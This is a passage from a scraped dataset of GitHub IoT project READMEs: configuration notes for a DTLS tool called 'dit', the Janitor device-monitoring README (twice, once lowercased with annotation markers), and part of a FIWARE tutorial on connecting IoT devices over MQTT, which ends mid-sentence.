targets\ntargets:\niot_srv_ip: 192.168.183.129\niot_srv_po: 1337\niot_cli_ip: 192.168.183.128\nciphers:\n# if no ciphers are configured, dit will offer all ciphersuites available with mbedtls\n#- tls-ecdhe-ecdsa-with-aes-256-cbc-sha384\n#- tls-psk-with-aes-128-ccm-8\n#- tls-rsa-with-aes-128-gcm-sha256\n# configure interface names\ninterfaces:\nex_if_name: ens33\nlh_if_name: lo\n# configure psk options\npsk:\ncli_id: client_identity\npre_sh_key: dit_secret\n# configure certificate options\ncertificate:\n# default is rsa. \"use_ecc\" arg enables ecc and disables key_size\nuse_cert: false\nkey_size: 2048\nuse_ecc: false\n# configure local dtls services\nlocal_services:\nlh_cli_ip: 127.0.0.1\nlh_cli_po: 1338\nlh_srv_ip: 127.0.0.1\nlh_srv_po: 1339\ntargets:\niot_srv_ip: ip address of the dtls server\niot_srv_po: port the dtls server is listening on\niot_cli_ip: ip address of the dtls client\nciphers: list of cipher suites (using the openssl format) dit will offer/support when establishing the connections. when no suites are configured dit offers/supports all cipher suites available with mbedtls.\ninterfaces:\nex_if_name: name of the external interface dit will operate on.\nlh_if_name: name of the internal interface dit will operate on. local dtls server and client services will operate on this interface.\npsk:\ncli_id: client identy to be used when accepting / establishing dtls connections. (default key is 'client_identity')\npr_sh_key: psk to be used when accepting / establishing dtls connections. (ascii encoded)\ncertificate:\nuse_cert: boolean value. activates the usage of rsa certificates. dit automatically creates and uses a corresponding certificate with \"key_size\" bits in length.\nkey_size: length of the rsa key in bits.\nuse_ecc: boolean value. activates the usege of ecc certificates. only works when \"use_cert\" is set. deactivates \"key_size\".\nlocal services:\nlh_cli_ip: ip address of the localhost interface the dtls client is running on. (typically 127.0.0.1)\nlh_cli_po: port the local client instance is accepting traffic on. (needn't be changed in a typical setup)\nlh_srv_ip: ip address of the localhost interface the dtls server is running on. (typically 127.0.0.1)\nlh_srv_po: port the local server instance is accepting traffic on. (needn't be changed in a typical setup)\n2.3.2 command line arguments\ndit can be configured via command line arguments. the arguments are listed and described when calling ./dit.py -h - as shown in section 2.1. command line arguments override settings stored in the configuration file and are a fast way to adapt/test settings without changing the config file.\n3. use cases / evaluation\nrefer to https://github.com/countablyinfinite/dit/tree/master/doc", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000785, "year": null}, {"Unnamed: 0": 789, "autor": 789, "date": null, "content": "janitor\nObjective\nJanitor is a standalone tool that monitors the availability of your IOT devices and alerts you in case a device goes missing or stops transmitting data. This is particulary useful if you have many sensors, possibly with unstable hardware or connection, so you can take action in case of any issues and monitor the stability of your devices.\nJanitor does not aim to implement any additional functionalities, therefore is not an alternative to your other home automation software (e.g. HASS). Focusing on solely this functionality will enable to keep this tool simple and efficient.\nJanitor currently supports the following monitoring methods:\nMQTT: Janitor will subscribe to predefined MQTT topics and monitor incoming messages. An average transmit frequency will be calculated for each channel and in case no new messages are received within this interval, Janitor will alert you (the threshold can be configured as a multiple of the average frequency or as absolute values per topic). This method is particulary useful for any kind of sensors submitting data regularly via MQTT (e.g. temperature).\nPing: Janitor will ping predefined hosts with a predefined frequency (configurable on a per host basis) and will alert you in case of no reply (the threshold used for consecutively missed pings can be configured). This method is useful for any kind of IOT devices e.g. sensors, cameras etc.\nHTTP: Janitor will send a HTTP GET request to predefined addresses and check for reply, and, optionally, whether the reply contains a predefined string. Janitor will alert you in case of consecutively unsuccessful requests above the configured threshold. The frequency and timeout are also configurable per address. This method is useful for any kind of services with a web interface (e.g. APIs, hosted services etc.).\nExec: Janitor will execute a preconfigured command and check for its exit code. Janitor will alert you in case of consecutively unsuccessful executions above the configured threshold. The frequency and timeout are also configurable per command. With this method you can implement any kind of custom monitoring.\nJanitor currently supports the following alert methods:\nTelegram: Janitor will send a message to a predefined Telegram channel.\nGotify: Janitor will send a push message to Gotify.\nMQTT: Janitor will publish a message to a preconfigured topic on a preconfigured MQTT server. The message will contain a JSON payload (see sample config for example). This is suitable for automations e.g. in HASS.\nExec: Janitor will execute a preconfigured command. This enables creating any type of custom alerting method.\nAdditionally, Janitor has a web interface where you can see the current status and historical data, remove items, change timeouts, intervals and thresholds and reload the configuration file (see screenshot below).\nFinally, Janitor includes a simple JSON api with the following endpoints:\n/api/data provides a snapshot of all monitoring related data.\n/api/stats provides the count of monitoring targets in functional/dysfunctional state.\nScreenshot\nBuilding and installing\nJanitor is written in Go and will compile to a single standalone binary. Janitor should compile and work both on Linux and on Windows.\nFor compiling, first install the necessary prerequisites and packr for embedding the HTML template in the binary:\n$ go get github.com/eclipse/paho.mqtt.golang\n$ go get github.com/go-telegram-bot-api/telegram-bot-api\n$ go get gopkg.in/yaml.v2\n$ go get github.com/gobuffalo/packr/packr\n$ go get github.com/gobuffalo/packr\nThen use the following commands to clone the repository and build the binary:\n$ git clone https://github.com/a-bali/janitor.git\n$ cd janitor\n$ packr build\nThis will create the standalone binary named janitor that you can place anywhere you like.\nConfiguration and usage\nFor configuration, a YAML formatted file is required. Please use the sample configuration file and change it according to your needs, following the comments in the file. Most of the variables are optional and have reasonable defaults, for details please see the comments.\nA minimal but already operational configuration can be as short as follows (assuming Janitor's web interface will be available on its default port which is 8080):\nmonitor:\nmqtt:\nserver: mymqtt.server\ntargets:\n- topic: \"/sensors/#\"\nalert:\ngotify:\nserver: \"http://mygotify.server:1234\"\ntoken: gotify_token\nOnce you created a configuration file, Janitor can be launched as follows:\n$ janitor path/to/your/configfile.yml\nJanitor will log to standard output. The log is viewable on the web interface as well, where you can delete monitored targets and reload the configuration file (e.g. in case you added new targets or changed any of the settings).\nJanitor will not daemonize itself. It is recommended to create a systemd service for janitor in case you want it running continuously.\nRunning with Docker\nDocker Hub automatically builds an image from the latest version of Janitor that can be pulled as abali/janitor. To use this, map your configuration file to /janitor/config.yml:\n$ docker run -v $(pwd)/config.yml:/janitor/config.yml -p 8080:8080 abali/janitor\nAlternatively, you can use the supplied Dockerfile to build a container yourself :\n$ git clone https://github.com/a-bali/janitor.git\n$ cd janitor\n$ docker build . -t janitor\n$ docker run -v $(pwd)/config.yml:/janitor/config.yml -p 8080:8080 janitor\nFuture plans and contributing\nJanitor's objective is clear and simple: to monitor the availability and operation of IOT devices and alert in case if any issues. Any future improvements should follow this objective and thus either add new ways of monitoring, or add new ways of alerting.\nJanitor is open source software and you are encouraged to send pull requests via Github that improve the software.\nLicense\nJanitor is licensed under GPL 3.0.", "link": "https://github.com/a-bali/janitor", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "janitor\nobjective\njanitor is a standalone -----> tool !!!  that monitors the availability of your iot devices and alerts you in case a device goes missing or stops transmitting data. this is particulary useful if you have many sensors, possibly with unstable hardware or connection, so you can take action in case of any issues and monitor the stability of your devices.\njanitor does not aim to implement any additional functionalities, therefore is not an alternative to your other home automation software (e.g. hass). focusing on solely this functionality will enable to keep this tool simple and efficient.\njanitor currently supports the following monitoring methods:\nmqtt: janitor will subscribe to predefined mqtt topics and monitor incoming messages. an average transmit frequency will be calculated for each channel and in case no new messages are received within this interval, janitor will alert you (the threshold can be configured as a multiple of the average frequency or as absolute values per topic). this method is particulary useful for any kind of sensors submitting data regularly via mqtt (e.g. temperature).\nping: janitor will ping predefined hosts with a predefined frequency (configurable on a per host basis) and will alert you in case of no reply (the threshold used for consecutively missed pings can be configured). this method is useful for any kind of iot devices e.g. sensors, cameras etc.\nhttp: janitor will send a http get request to predefined addresses and check for reply, and, optionally, whether the reply contains a predefined string. janitor will alert you in case of consecutively unsuccessful requests above the configured threshold. the frequency and timeout are also configurable per address. this method is useful for any kind of services with a web interface (e.g. apis, hosted services etc.).\nexec: janitor will execute a preconfigured command and check for its exit code. janitor will alert you in case of consecutively unsuccessful executions above the configured threshold. the frequency and timeout are also configurable per command. with this method you can implement any kind of custom monitoring.\njanitor currently supports the following alert methods:\ntelegram: janitor will send a message to a predefined telegram channel.\ngotify: janitor will send a push message to gotify.\nmqtt: janitor will publish a message to a preconfigured topic on a preconfigured mqtt server. the message will contain a json payload (see sample config for example). this is suitable for automations e.g. in hass.\nexec: janitor will execute a preconfigured command. this enables creating any type of custom alerting method.\nadditionally, janitor has a web interface where you can see the current status and historical data, remove items, change timeouts, intervals and thresholds and reload the configuration file (see screenshot below).\nfinally, janitor includes a simple json api with the following endpoints:\n/api/data provides a snapshot of all monitoring related data.\n/api/stats provides the count of monitoring targets in functional/dysfunctional state.\nscreenshot\nbuilding and installing\njanitor is written in go and will compile to a single standalone binary. janitor should compile and work both on linux and on windows.\nfor compiling, first install the necessary prerequisites and packr for embedding the html template in the binary:\n$ go get github.com/eclipse/paho.mqtt.golang\n$ go get github.com/go-telegram-bot-api/telegram-bot-api\n$ go get gopkg.in/yaml.v2\n$ go get github.com/gobuffalo/packr/packr\n$ go get github.com/gobuffalo/packr\nthen use the following commands to clone the repository and build the binary:\n$ git clone https://github.com/a-bali/janitor.git\n$ cd janitor\n$ packr build\nthis will create the standalone binary named janitor that you can place anywhere you like.\nconfiguration and usage\nfor configuration, a yaml formatted file is required. please use the sample configuration file and change it according to your needs, following the comments in the file. most of the variables are optional and have reasonable defaults, for details please see the comments.\na minimal but already operational configuration can be as short as follows (assuming janitor's web interface will be available on its default port which is 8080):\nmonitor:\nmqtt:\nserver: mymqtt.server\ntargets:\n- topic: \"/sensors/#\"\nalert:\ngotify:\nserver: \"http://mygotify.server:1234\"\ntoken: gotify_token\nonce you created a configuration file, janitor can be launched as follows:\n$ janitor path/to/your/configfile.yml\njanitor will log to standard output. the log is viewable on the web interface as well, where you can delete monitored targets and reload the configuration file (e.g. in case you added new targets or changed any of the settings).\njanitor will not daemonize itself. it is recommended to create a systemd service for janitor in case you want it running continuously.\nrunning with docker\ndocker hub automatically builds an image from the latest version of janitor that can be pulled as abali/janitor. to use this, map your configuration file to /janitor/config.yml:\n$ docker run -v $(pwd)/config.yml:/janitor/config.yml -p 8080:8080 abali/janitor\nalternatively, you can use the supplied dockerfile to build a container yourself :\n$ git clone https://github.com/a-bali/janitor.git\n$ cd janitor\n$ docker build . -t janitor\n$ docker run -v $(pwd)/config.yml:/janitor/config.yml -p 8080:8080 janitor\nfuture plans and contributing\njanitor's objective is clear and simple: to monitor the availability and operation of iot devices and alert in case if any issues. any future improvements should follow this objective and thus either add new ways of monitoring, or add new ways of alerting.\njanitor is open source software and you are encouraged to send pull requests via github that improve the software.\nlicense\njanitor is licensed under gpl 3.0.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000789, "year": null}, {"Unnamed: 0": 790, "autor": 790, "date": null, "content": "This tutorial uses introduces the use of the MQTT protocol across IoT devices connecting to FIWARE. The UltraLight 2.0 IoT Agent created in the previous tutorial is reconfigured to communicate with a set of dummy IoT devices using MQTT via a Mosquitto message broker\nThe tutorial uses cUrl commands throughout, but is also available as Postman documentation\n\u3053\u306e\u30c1\u30e5\u30fc\u30c8\u30ea\u30a2\u30eb\u306f\u65e5\u672c\u8a9e\u3067\u3082\u3054\u89a7\u3044\u305f\u3060\u3051\u307e\u3059\u3002\nContents\nDetails\nWhat is MQTT?\n\"With the technology at our disposal, the possibilities are unbounded. All we need to do is make sure we keep talking.\"\n\u2014 Stephen Hawking\n\"MQTT is a publish-subscribe-based messaging protocol used in the internet of Things. It works on top of the TCP/IP protocol, and is designed for connections with remote locations where a \"small code footprint\" is required or the network bandwidth is limited. The goal is to provide a protocol, which is bandwidth-efficient and uses little battery power.\"1\nThe previous tutorial used HTTP as its transport mechanism between the devices and the IoT Agent. HTTP uses a request/response paradigm where each device connects directly to the IoT Agent. MQTT is different in that publish-subscribe is event-driven and pushes messages to clients. It requires an additional central communication point (known as the MQTT broker) which it is in charge of dispatching all messages between the senders and the rightful receivers. Each client that publishes a message to the broker, includes a topic into the message. The topic is the routing information for the broker. Each client that wants to receive messages subscribes to a certain topic and the broker delivers all messages with the matching topic to the client. Therefore the clients don\u2019t have to know each other, they only communicate over the topic. This architecture enables highly scalable solutions without dependencies between the data producers and the data consumers.\nA summary of the differences between the two transport protocols can be seen below:\nHTTP Transport MQTT Transport\nIoT Agent communicates with IoT devices directly IoT Agent communicates with IoT devices indirectly via an MQTT Broker\nRequest-Response Paradigm Publish-Subscribe Paradigm\nIoT Devices must always be ready to receive communication IoT Devices choose when to receive communication\nHigher Power Requirement Low Power Requirement\nThe UltraLight 2.0 IoT Agent will only send or interpret messages using the UltraLight 2.0 syntax, however it can be used to send and receive messages over multiple transport mechanisms. Therefore we are able to use the same FIWARE generic enabler to connect to a wider range of IoT devices.\nMosquitto MQTT Broker\nMosquitto is a readily available, open source MQTT broker which will be used during this tutorial. It is available licensed under EPL/EDL. More information can be found at https://mosquitto.org/\nDevice Monitor\nFor the purpose of this tutorial, a series of dummy IoT devices have been created, which will be attached to the context broker. Details of the architecture and protocol used can be found in the IoT Sensors tutorial The state of each device can be seen on the UltraLight device monitor web page found at: http://localhost:3000/device/monitor\nArchitecture\nThis application builds on the components created in previous tutorials. It will make use of two FIWARE components - the Orion Context Broker and the IoT Agent for UltraLight 2.0. Usage of the Orion Context Broker is sufficient for an application to qualify as \u201cPowered by FIWARE\u201d. Both the Orion Context Broker and the IoT Agent rely on open source MongoDB technology to keep persistence of the information they hold. We will also be using the dummy IoT devices created in the previous tutorial Additionally we will add an instance of the Mosquitto MQTT broker which is open source and available under the EPL/EDL.\nTherefore the overall architecture will consist of the following elements:\nThe FIWARE Orion Context Broker which will receive requests using NGSI-v2\nThe FIWARE IoT Agent for UltraLight 2.0 which will:\nreceive southbound requests using NGSI-v2 and convert them to UltraLight 2.0 MQTT topics for the MQTT Broker\nlisten to the MQTT Broker on registered topics to send measurements northbound\nThe Mosquitto MQTT Broker which acts as a central communication point, passing MQTT topics between the IoT Agent and IoT devices as necessary.\nThe underlying MongoDB database :\nUsed by the Orion Context Broker to hold context data information such as data entities, subscriptions and registrations\nUsed by the IoT Agent to hold device information such as device URLs and Keys\nA webserver acting as set of dummy IoT devices using the UltraLight 2.0 protocol running over MQTT.\nThe Context Provider NGSI proxy is not used in this tutorial. It does the following:\nreceive requests using NGSI-v2\nmakes requests to publicly available data sources using their own APIs in a proprietary format\nreturns context data back to the Orion Context Broker in NGSI-v2 format.\nThe Stock Management Frontend is not used in this tutorial will it does the following:\nDisplay store information\nShow which products can be bought at each store\nAllow users to \"buy\" products and reduce the stock count.\nSince all interactions between the elements are initiated by HTTP or MQTT requests over TCP, the entities can be containerized and run from exposed ports.\nThe necessary configuration information for wiring up the Mosquitto MQTT Broker, the IoT devices and the IoT Agent can be seen in the services section of the associated docker-compose.yml file:\nMosquitto Configuration\nmosquitto:\nimage: eclipse-mosquitto\nhostname: mosquitto\ncontainer_name: mosquitto\nnetworks:\n- default\nexpose:\n- \"1883\"\n- \"9001\"\nports:\n- \"1883:1883\"\n- \"9001:9001\"\nvolumes:\n- ./mosquitto/mosquitto.conf:/mosquitto/config/mosquitto.conf\nThe mosquitto container is listening on two ports:\nPort 1883 is exposed so we can post MQTT topics\nPort 9001 is the standard port for HTTP/Websocket communications\nThe attached volume is a configuration file used to increase the debug level of the MQTT Message Broker.\nDummy IoT Devices Configuration\ntutorial:\nimage: fiware/tutorials.context-provider\nhostname: iot-sensors\ncontainer_name: fiware-tutorial\nnetworks:\n- default\nexpose:\n- \"3000\"\n- \"3001\"\nports:\n- \"3000:3000\"\n- \"3001:3001\"\nenvironment:\n- \"DEBUG=tutorial:*\"\n- \"WEB_APP_PORT=3000\"\n- \"DUMMY_DEVICES_PORT=3001\"\n- \"DUMMY_DEVICES_API_KEY=4jggokgpepnvsb2uv4s40d59ov\"\n- \"DUMMY_DEVICES_TRANSPORT=MQTT\"\nThe tutorial container is listening on two ports:\nPort 3000 is exposed so we can see the web page displaying the Dummy IoT devices.\nPort 3001 is exposed purely for tutorial access - so that cUrl or Postman can make UltraLight commands without being part of the same network.\nThe tutorial container is driven by environment variables as shown:\nKey Value Description\nDEBUG tutorial:* Debug flag used for logging\nWEB_APP_PORT 3000 Port used by web-app which displays the dummy device data\nDUMMY_DEVICES_PORT 3001 Port used by the dummy IoT devices to receive commands\nDUMMY_DEVICES_API_KEY 4jggokgpepnvsb2uv4s40d59ov Random security key used for UltraLight interactions - used to ensure the integrity of interactions between the devices and the IoT Agent\nDUMMY_DEVICES_TRANSPORT MQTT The transport protocol used by the dummy IoT devices\nThe other tutorial container configuration values described in the YAML file are not used in this tutorial.\nIoT Agent for UltraLight 2.0 Configuration\nThe IoT Agent for UltraLight 2.0 can be instantiated within a Docker container. An official Docker image is available from Docker Hub tagged fiware/iotagent-ul. The necessary configuration can be seen below:\niot-agent:\nimage: fiware/iotagent-ul:latest\nhostname: iot-agent\ncontainer_name: fiware-iot-agent\ndepends_on:\n- mongo-db\nnetworks:\n- default\nexpose:\n- \"4041\"\nports:\n- \"4041:4041\"\nenvironment:\n- IOTA_CB_HOST=orion\n- IOTA_CB_PORT=1026\n- IOTA_NORTH_PORT=4041\n- IOTA_REGISTRY_TYPE=mongodb\n- IOTA_LOG_LEVEL=DEBUG\n- IOTA_TIMESTAMP=true\n- IOTA_CB_NGSI_VERSION=v2\n- IOTA_AUTOCAST=true\n- IOTA_MONGO_HOST=mongo-db\n- IOTA_MONGO_PORT=27017\n- IOTA_MONGO_DB=iotagentul\n- IOTA_PROVIDER_URL=http://iot-agent:4041\n- IOTA_MQTT_HOST=mosquitto\n- IOTA_MQTT_PORT=1883\nThe iot-agent container relies on the presence of the Orion Context Broker and uses a MongoDB database to hold device information such as device URLs and Keys. The container is listening on a single port:\nPort 4041 is exposed purely for tutorial access - so that cUrl or Postman can make provisioning commands without being part of the same network.\nThe iot-agent container is driven by environment variables as shown:\nKey Value Description\nIOTA_CB_HOST orion Hostname of the context broker to update context\nIOTA_CB_PORT 1026 Port that context broker listens on to update context\nIOTA_NORTH_PORT 4041 Port used for Configuring the IoT Agent and receiving context updates from the context broker\nIOTA_REGISTRY_TYPE mongodb Whether to hold IoT device info in memory or in a database\nIOTA_LOG_LEVEL DEBUG The log level of the IoT Agent\nIOTA_TIMESTAMP true Whether to supply timestamp information with each measurement received from attached devices\nIOTA_CB_NGSI_VERSION v2 Whether to supply use NGSI v2 when sending updates for active attributes\nIOTA_AUTOCAST true Ensure Ultralight number values are read as numbers not strings\nIOTA_MONGO_HOST context-db The hostname of mongoDB - used for holding device information\nIOTA_MONGO_PORT 27017 The port mongoDB is listening on\nIOTA_MONGO_DB iotagentul The name of the database used in mongoDB\nIOTA_PROVIDER_URL http://iot-agent:4041 URL passed to the Context Broker when commands are registered, used as a forwarding URL location when the Context Broker issues a command to a device\nIOTA_MQTT_HOST mosquitto The hostname of the MQTT Broker\nIOTA_MQTT_PORT 1883 The port the MQTT Broker is listening on to receive topics\nAs you can see, use of the MQTT transport is driven by only two environment variables IOTA_MQTT_HOST and IOTA_MQTT_PORT\nPrerequisites\nDocker and Docker Compose\nTo keep things simple all components will be run using Docker. Docker is a container technology which allows to different components isolated into their respective environments.\nTo install Docker on Windows follow the instructions here\nTo install Docker on Mac follow the instructions here\nTo install Docker on Linux follow the instructions here\nDocker Compose is a tool for defining and running multi-container Docker applications. A YAML file is used configure the required services for the application. This means all container services can be brought up in a single command. Docker Compose is installed by default as part of Docker for Windows and Docker for Mac, however Linux users will need to follow the instructions found here\nYou can check your current Docker and Docker Compose versions using the following commands:\ndocker-compose -v\ndocker version\nPlease ensure that you are using Docker version 20.10 or higher and Docker Compose 1.29 or higher and upgrade if necessary.\nCygwin for Windows\nWe will start up our services using a simple Bash script. Windows users should download cygwin to provide a command-line functionality similar to a Linux distribution on Windows.\nStart Up\nBefore you start you should ensure that you have obtained or built the necessary Docker images locally. Please clone the repository and create the necessary images by running the commands as shown:\ngit clone https://github.com/FIWARE/tutorials.IoT-over-MQTT.git\ncd tutorials.IoT-over-MQTT\ngit checkout NGSI-v2\n./services create\nThereafter, all services can be initialized from the command-line by running the services Bash script provided within the repository:\n./services start\n\u2139\ufe0f Note: If you want to clean up and start over again you can do so with the following command:\n./services stop\nProvisioning an IoT Agent (UltraLight over MQTT)\nTo follow the tutorial correctly please ensure you have the device monitor page available in your browser and click on the page to enable audio before you enter any cUrl commands. The device monitor displays the current state of an array of dummy devices using Ultralight 2.0 syntax\nDevice Monitor\nThe device monitor can be found at: http://localhost:3000/device/monitor\nChecking Mosquitto Health\nWe will start by mimicking the roles of both the IoT Agent and a dummy IoT device and send and receive some messages using MQTT. This section of the tutorial requires several open terminals.\nStart an MQTT Subscriber (1\ufe0f\u20e3st Terminal)\nEventually once we have wired by the system correctly, IoT Agent will subscribe to all relevant events to listen for northbound traffic in the form of sensor measurements. It therefore will need to make a subscription across all topics. Similarly an actuator must subscribe to a single topic to receive events which effect itself when commands are sent southbound. To check that the lines of communication are open, we can subscribe to a given topic, and see that we are able to receive something when a message is published.\nOpen a new terminal, and create a new running mqtt-subscriber Docker container as follows:\ndocker run -it --rm --name mqtt-subscriber \\\n--network fiware_default efrecon/mqtt-client sub -h mosquitto -t \"/#\"\nThe terminal will then be ready to receive events\nStart an MQTT Publisher (2\ufe0f\u20e3nd Terminal)\nA sensor sending northbound measurements will publish to those measurements to the MQTT Broker to be passed on to any subscriber than wants them. The sensor will not need to make a connection to the subscriber directly.\nOpen a new terminal, and run a mqtt-publisher Docker container to send a message as follows:\ndocker run -it --rm --name mqtt-publisher \\\n--network fiware_default efrecon/mqtt-client pub -h mosquitto -m \"HELLO WORLD\" -t \"/test\"\n1\ufe0f\u20e3st terminal - Result:\nIf the MQTT Broker is functioning correctly, the message should be received in the other terminal\nHELLO WORLD\nStop an MQTT Subscriber (2\ufe0f\u20e3nd Terminal)\nTo terminate the MQTT subscriber, run the following Docker command:\ndocker stop mqtt-subscriber\nShow Mosquitto Log\nTo show that the communication occurred via the MQTT Broker, we can inspect the log of the mosquitto Docker container as shown:\ndocker logs --tail 10 mosquitto\nResult:\n1529661883: New client connected from 172.18.0.5 as mqttjs_8761e518 (c1, k0).\n1529662472: New connection from 172.18.0.7 on port 1883.\n1529662472: New client connected from 172.18.0.7 as mosqpub|1-5637527c63c1 (c1, k60).\n1529662472: Client mosqpub|1-5637527c63c1 disconnected.\n1529662614: New connection from 172.18.0.7 on port 1883.\n1529662614: New client connected from 172.18.0.7 as mosqsub|1-64b27d675f58 (c1, k60).\n1529662623: New connection from 172.18.0.8 on port 1883.\n1529662623: New client connected from 172.18.0.8 as mosqpub|1-ef03e74b0270 (c1, k60).\n1529662623: Client mosqpub|1-ef03e74b0270 disconnected.\n1529667841: Socket error on client mosqsub|1-64b27d675f58, disconnecting.\nChecking the IoT Agent Service Health\nYou can check if the IoT Agent is running by making an HTTP request to the exposed port:\n1\ufe0f\u20e3 Request:\ncurl -X GET \\\n'http://localhost:4041/iot/about'\nThe response will look similar to the following:\n{\n\"libVersion\": \"2.6.0-next\",\n\"port\": \"4041\",\n\"baseRoot\": \"/\",\n\"version\": \"1.6.0-next\"\n}\nWhat if I get a Failed to connect to localhost port 4041: Connection refused Response?\nIf you get a Connection refused response, the IoT Agent cannot be found where expected for this tutorial - you will need to substitute the URL and port in each cUrl command with the corrected IP address. All the cUrl commands tutorial assume that the IoT Agent is available on localhost:4041.\nTry the following remedies:\nTo check that the docker containers are running try the following:\ndocker ps\nYou should see four containers running. If the IoT Agent is not running, you can restart the containers as necessary. This command will also display open port information.\nIf you have installed docker-machine and Virtual Box, the context broker, IoT Agent and Dummy Device docker containers may be running from another IP address - you will need to retrieve the virtual host IP as shown:\ncurl -X GET \\\n'http://$(docker-machine ip default):4041/version'\nAlternatively run all your curl commands from within the container network:\ndocker run --network fiware_default --rm appropriate/curl -s \\\n-X GET 'http://iot-agent:4041/iot/about'\nConnecting IoT Devices\nThe IoT Agent acts as a middleware between the IoT devices and the context broker. It therefore needs to be able to create context data entities with unique IDs. Once a service has been provisioned and an unknown device makes a measurement the IoT Agent add this to the context using the supplied <device-id> (unless the device is recognized and can be mapped to a known ID.\nThere is no guarantee that every supplied IoT device <device-id> will always be unique, therefore all provisioning requests to the IoT Agent require two mandatory headers:\nfiware-service header is defined so that entities for a given service can be held in a separate mongoDB database.\nfiware-servicepath can be used to differentiate between arrays of devices.\nFor example within a smart city application you would expect different fiware-service headers for different departments (e.g. parks, transport, refuse collection etc.) and each fiware-servicepath would refer to specific park and so on. This would mean that data and devices for each service can be identified and separated as needed, but the data would not be siloed - for example data from a Smart Bin within a park can be combined with the GPS Unit of a refuse truck to alter the route of the truck in an efficient manner.\nThe Smart Bin and GPS Unit are likely to come from different manufacturers and it cannot be guaranteed that there is no overlap within <device-id>s used. The use of the fiware-service and fiware-servicepath headers can ensure that this is always the case, and allows the context broker to identify the original source of the context data.\nProvisioning a Service Group for MQTT\nInvoking group provision is always the first step in connecting devices. For MQTT communication, provisioning supplies the authentication key so the IoT Agent will know which topic it must subscribe to.\nIt is possible to set up default commands and attributes for all devices as well, but this is not done within this tutorial as we will be provisioning each device separately.\nThis example provisions an anonymous group of devices. It tells the IoT Agent that a series of devices will be communicating by sending messages to the /4jggokgpepnvsb2uv4s40d59ov topic\nThe resource attribute is left blank since HTTP communication is not being used. The URL location of cbroker is an optional attribute - if it is not provided, the IoT Agent uses the default context broker URL as defined in the configuration file, however it has been added here for completeness.\n2\ufe0f\u20e3 Request:\ncurl -iX POST \\\n'http://localhost:4041/iot/services' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"services\": [\n{\n\"apikey\": \"4jggokgpepnvsb2uv4s40d59ov\",\n\"cbroker\": \"http://orion:1026\",\n\"entity_type\": \"Thing\",\n\"resource\": \"\"\n}\n]\n}'\nProvisioning a Sensor\nIt is common good practice to use URNs following the NGSI-LD specification when creating entities. Furthermore it is easier to understand meaningful names when defining data attributes. These mappings can be defined by provisioning a device individually.\nThree types of measurement attributes can be provisioned:\nattributes are active readings from the device\nlazy attributes are only sent on request - The IoT Agent will inform the device to return the measurement\nstatic_attributes are as the name suggests static data about the device (such as relationships) passed on to the context broker.\nNote: in the case where individual ids are not required, or aggregated data is sufficient the attributes can be defined within the provisioning service rather than individually.\n3\ufe0f\u20e3 Request:\ncurl -iX POST \\\n'http://localhost:4041/iot/devices' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"motion001\",\n\"entity_name\": \"urn:ngsi-ld:Motion:001\",\n\"entity_type\": \"Motion\",\n\"protocol\": \"PDI-IoTA-UltraLight\",\n\"transport\": \"MQTT\",\n\"timezone\": \"Europe/Berlin\",\n\"attributes\": [\n{ \"object_id\": \"c\", \"name\": \"count\", \"type\": \"Integer\" }\n],\n\"static_attributes\": [\n{ \"name\":\"refStore\", \"type\": \"Relationship\", \"value\": \"urn:ngsi-ld:Store:001\"}\n]\n}\n]\n}\n'\nIn the request we are associating the device motion001 with the URN urn:ngsi-ld:Motion:001 and mapping the device reading c with the context attribute count (which is defined as an Integer) A refStore is defined as a static_attribute, placing the device within Store urn:ngsi-ld:Store:001.\nThe addition of the transport=MQTT attribute in the body of the request is sufficient to tell the IoT Agent that it should subscribe to the /<api-key>/<device-id> topic to receive measurements.\nYou can simulate a dummy IoT device measurement coming from the Motion Sensor device motion001, by posting an MQTT message to the following topic\n4\ufe0f\u20e3 MQTT Request:\ndocker run -it --rm --name mqtt-publisher --network \\\nfiware_default efrecon/mqtt-client pub -h mosquitto -m \"c|1\" \\\n-t \"/4jggokgpepnvsb2uv4s40d59ov/motion001/attrs\"\nThe value of the -m parameter defines the message. This is in UltraLight syntax.\nThe value of the -t parameter defines the topic.\nThe topic must be in the following form:\n/<api-key>/<device-id>/attrs\nNote In the previous tutorial, when testing HTTP connectivity between the Motion Sensor and an IoT Agent, a similar dummy HTTP request was sent to update the count value. This time the IoT Agent is configured to listen to MQTT topics, and we need to post a dummy message to an MQTT topic.\nWhen using the MQTT transport protocol, the IoT Agent is subscribing to the MQTT topics and the device monitor will be configured to display all MQTT messages sent to each topic - effectively it is showing the list messages received and sent by Mosquitto.\nWith the IoT Agent connected via MQTT, the service group has defined the topic which the agent is subscribed to. Since the api-key matches the root of the topic, the MQTT message from the Motion Sensor is passed to the IoT Agent which has previously subscribed.\nBecause we have specifically provisioned the device (motion001) - the IoT Agent is able to map attributes before raising a request with the Orion Context Broker.\nYou can see that a measurement has been recorded by retrieving the entity data from the context broker. Don't forget to add the fiware-service and fiware-service-path headers.\n5\ufe0f\u20e3 Request:\ncurl -X GET \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:Motion:001?type=Motion' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /'\nResponse:\n{\n\"id\": \"urn:ngsi-ld:Motion:001\",\n\"type\": \"Motion\",\n\"TimeInstant\": {\n\"type\": \"ISO8601\",\n\"value\": \"2018-05-25T10:51:32.00Z\",\n\"metadata\": {}\n},\n\"count\": {\n\"type\": \"Integer\",\n\"value\": \"1\",\n\"metadata\": {\n\"TimeInstant\": {\n\"type\": \"ISO8601\",\n\"value\": \"2018-05-25T10:51:32.646Z\"\n}\n}\n}\n}\nThe response shows that the Motion Sensor device with id=motion001 has been successfully identified by the IoT Agent and mapped to the entity id=urn:ngsi-ld:Motion:001. This new entity has been created within the context data. The c attribute from the dummy device measurement request has been mapped to the more meaningful count attribute within the context. As you will notice, a TimeInstant attribute has been added to both the entity and the metadata of the attribute - this represents the last time the entity and attribute have been updated, and is automatically added to each new entity because the IOTA_TIMESTAMP environment variable was set when the IoT Agent was started up.\nProvisioning an Actuator\nProvisioning an actuator is similar to provisioning a 